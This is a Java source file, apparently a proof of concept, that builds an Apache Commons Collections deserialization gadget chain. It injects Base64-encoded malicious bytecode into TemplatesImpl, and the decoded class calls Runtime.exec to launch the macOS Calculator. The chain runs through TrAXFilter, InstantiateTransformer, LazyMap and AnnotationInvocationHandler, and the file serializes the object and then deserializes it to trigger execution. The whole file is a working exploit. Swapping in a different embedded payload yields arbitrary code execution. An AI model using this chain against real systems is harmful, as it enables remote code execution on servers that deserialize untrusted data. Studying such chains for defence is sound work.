import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class example1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
   //     setFieldValue(obj, "_bytecodes", new byte[][]{
  //              ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
 //       });
        setFieldValue(obj, "_bytecodes", new byte[][]{Base64.getDecoder().decode("yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMADgAOQEAFmV2aWwvRXZpbFRlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAAAAAAMAAQAKAAsAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAAsADgAAACAAAwAAAAEADwAQAAAAAAABABEAEgABAAAAAQATABQAAgAVAAAABAABABYAAQAKABcAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAA0ADgAAACoABAAAAAEADwAQAAAAAAABABEAEgABAAAAAQAYABkAAgAAAAEAGgAbAAMAFQAAAAQAAQAWAAEAHAAdAAIADAAAAEwAAgABAAAAFiq3AAGyAAISA7YABLgABRIGtgAHV7EAAAACAA0AAAASAAQAAAAQAAQAEQAMABIAFQATAA4AAAAMAAEAAAAWAA8AEAAAABUAAAAEAAEAHgABAB8AAAACACA=")});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
   //     Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        setFieldValue(transformerChain, "iTransformers", transformers);
        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        // 本地测试触发
  //      System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}